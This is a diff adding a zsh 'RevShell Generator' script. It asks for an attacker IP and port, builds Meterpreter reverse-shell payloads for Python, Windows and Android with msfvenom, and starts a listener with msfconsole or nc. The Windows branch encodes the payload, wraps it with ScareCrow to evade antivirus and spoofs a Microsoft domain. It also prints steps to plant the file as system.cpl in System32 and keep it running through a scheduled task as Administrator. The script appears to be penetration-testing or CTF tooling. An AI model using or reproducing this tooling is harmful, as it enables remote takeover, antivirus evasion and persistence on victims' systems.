@@ -1,0 +1,75 @@
+#!/bin/zsh -i
+# RevShell Generator
+need metasploit
+upline() {
+    echo -en "\033[G\033[A\033[2K"
+}
+readmod() {
+    echo -n "$1 "
+    read $2
+    eval value=\$$2
+    if [[ -z "$value" ]]; then
+        case $2 in
+            ip) value=$(ip addr show tun0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1) ;;
+            port) value=9001 ;;
+        esac
+        eval $2='$value'
+    fi
+    if [[ $2 == "port" && (! "$value" =~ ^[0-9]+$ || "$value" -lt 1 || "$value" -gt 65535) ]]; then
+        echo "Invalid port entered."
+        exit 1
+    fi
+    upline
+    echo "$1 $value"
+}
+readmod 'Ip->' 'ip'
+readmod 'Port->' 'port'
+file=$({ echo "meterpreter"; find "$HOME/.local/www/revsh/" -mindepth 1 -type f -exec basename {} \; } | fzf-splitted)
+if [[ $file == "meterpreter" ]]; then
+    mode=$(echo -e "python\nwindows\nandroid" | fzf-splitted)
+    if [[ $mode == "python" ]]; then
+        msfvenom -p python/meterpreter_reverse_tcp LHOST="$ip" LPORT="$port" MeterpreterTryToFork=false -o /tmp/shell
+        sudo sed -i '1i#!/bin/python3' /tmp/shell
+        sudo chmod +x /tmp/shell
+        echo "File saved at: /tmp/shell"
+    elif [[ $mode == "windows" ]]; then 
+        scarepath="$HOME/.local/opt/scarecrow"
+        payload_file="$scarepath/av-bypass.bin"
+        cd "$HOME/.local/opt/scarecrow"
+        rm -rf "$payload_file" 2> /dev/null 2>&1
+        msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="$ip" LPORT="$port" -e x64/shikata_ga_nai -b '\x00' -f raw -o "$payload_file"
+        scarecrow -I "$payload_file" --domain www.microsoft.com --encryptionmode AES -Loader control | tail -n +12 | head -n -1
+        echo -e "Rename the .cpl in system.cpl"
+        echo -e "Put in C:Windows/System32/ system.cpl"
+        echo -e "Run \"start system.cpl\" or run as admin run :"
+        echo ' schtasks /create /tn System /tr "control %windir%\system32\system.cpl" /sc MINUTE /mo 1 /ru Administrator /rl HIGHEST /it'
+        echo "File saved at: $scarepath/system.cpl"
+    elif [[ $mode == "android" ]]; then 
+        msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT="$port" -o "/tmp/rev.apk"
+        echo "File saved at: /tmp/rev.apk"
+    fi
+    echo "Listener starting on port $port..."
+    msfconsole -qx "use exploit/multi/handler; set LHOST $ip; set LPORT $port; exploit"
+else
+    default_ext="${file##*.}"
+    echo -n "Ext-> "; read ext
+    ext=${ext:-$default_ext}
+    upline; echo "Ext-> $ext"
+    new_filename="/tmp/rev.$ext"
+    save_file() {
+        echo "File saved at: $new_filename"
+    }
+    listener() {
+        echo "Listener starting on port $port..."
+        nc -lvnp $port
+    }
+    directory_path=$(dirname "$file")
+    if [[ -f "$HOME/.local/www/revsh/$file" ]]; then
+        sed "s/YXYXYX/$ip/g; s/XYXYXY/$port/g" "$HOME/.local/www/revsh/$file" > "$new_filename"
+        save_file
+        listener
+    else
+        echo "File not recognized."
+        exit 1
+    fi
+fi
